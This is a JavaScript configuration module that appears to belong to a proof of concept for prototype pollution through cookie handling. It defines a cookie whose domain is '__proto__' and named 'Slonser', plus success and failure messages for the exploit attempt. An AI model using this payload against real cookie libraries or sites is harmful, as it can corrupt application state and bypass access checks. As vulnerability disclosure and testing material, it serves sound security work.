// Configuration
var config = {
  cookieDomain: "__proto__",
  googleCookieDomain: "google.com",
  cookiePath: "/notauth",
  exploitCookieName: "Slonser",
  exploitCookieValue: "polluted",
  normalCookieName: "Auth",
  normalCookieValue: "Lol",
  testUrl: "https://__proto__/admin",
  normalUrl: "https://google.com/",
  rejectPublicSuffixes: false,
  exploitedSuccessfully: "EXPLOITED SUCCESSFULLY",
  exploitFailed: "EXPLOIT FAILED",
  exploitError: "Error during exploit attempt:",
};

var cookies = {
  exploitCookie: `${config.exploitCookieName}=${config.exploitCookieValue}; Domain=${config.cookieDomain}; Path=${config.cookiePath}`,
  normalCookie: `${config.normalCookieName}=${config.normalCookieValue}; Domain=${config.googleCookieDomain}; Path=${config.cookiePath}`
}

module.exports = {
  config,
  cookies
};
